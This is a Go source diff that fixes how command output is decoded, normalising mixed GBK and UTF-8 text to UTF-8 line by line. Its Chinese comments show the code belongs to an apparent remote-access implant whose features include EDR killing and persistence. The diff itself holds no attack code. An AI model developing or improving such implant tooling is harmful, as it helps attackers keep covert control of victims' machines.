@@ -12,6 +12,7 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unicode/utf8"
 	"unsafe"
 )
 
@@ -113,10 +114,12 @@ func executeCommand(command string, args []string) (string, int32, string) {
 		if ee, ok := err.(*exec.ExitError); ok {
 			code = int32(ee.ExitCode())
 		}
-		// 附加命令输出中的具体报错(GBK 转 UTF-8),便于定位失败原因
+		// 附加命令输出中的具体报错（归一成 UTF-8 便于定位失败原因）。
+		// 这里也用逐行判定：命令输出可能已经是 UTF-8（例如 PowerShell 7 / 自带 UTF-8 的工具），
+		// 无脑 GBK 转换会把正确中文打成乱码（与 executeTask 末尾同一口径）。
 		errMsg := err.Error()
 		if len(out) > 0 {
-			errMsg = errMsg + ": " + string(gbkToUTF8(out))
+			errMsg = errMsg + ": " + decodeConsoleText(string(out))
 		}
 		return string(out), code, errMsg
 	}
@@ -248,4 +251,36 @@ func utf8ToGBK(data []byte) []byte {
 		}
 	}
 	return data
+}
+
+// decodeConsoleText 把任务输出归一成 UTF-8（**逐行判定**，这是关键）。
+//
+// 历史 bug：executeTask 末尾对**整串**输出无条件跑一遍 gbkToUTF8，于是植入端自己写的
+// UTF-8 中文回执（"== EDR Kill (击杀) =="、"持久化成功"、启动项 JSON 里中文描述）被当成
+// GBK 又转了一次，界面上就是"鍑绘潃 / 娉ㄥ唽琛ㄥ惎鍔"这类乱码；而被调用的中文控制台
+// 工具（taskkill/reg/sc…）吐的真实 GBK 又确实需要转 —— 一串里两种编码混着，整串转只能
+// 满足一边。
+//
+// 逐行判定的依据：GBK 双字节的尾字节多在 0x40–0xFE，绝大多数组合不是合法 UTF-8 序列；
+// 而植入端自己写的中文/ASCII 一律是合法 UTF-8。因此：
+//   - 整串已合法 UTF-8（纯植入端文本、纯 ASCII、base64 JSON…）→ 原样返回，零改动；
+//   - 否则逐行：合法 UTF-8 的行原样保留，非法 UTF-8 的行按 GBK→UTF-8 转。
+//
+// 幂等：合法 UTF-8 输入永远原样返回，所以"捕获点转一次 + 汇总处再转一次"不会二次损坏。
+//
+// 为什么一定要在客户端转：结果帧是 json.Marshal(Result)，非法 UTF-8 字节在序列化时会被
+// 替换成 U+FFFD（字节永久丢失），服务端拿到的是"已经救不回来的"文本。服务端展示层
+// （internal/common/encoding）只作旧版本载荷与其它来源的兜底。
+func decodeConsoleText(s string) string {
+	if s == "" || utf8.ValidString(s) {
+		return s
+	}
+	lines := strings.Split(s, "\n")
+	for i, line := range lines {
+		if line == "" || utf8.ValidString(line) {
+			continue
+		}
+		lines[i] = string(gbkToUTF8([]byte(line)))
+	}
+	return strings.Join(lines, "\n")
 }
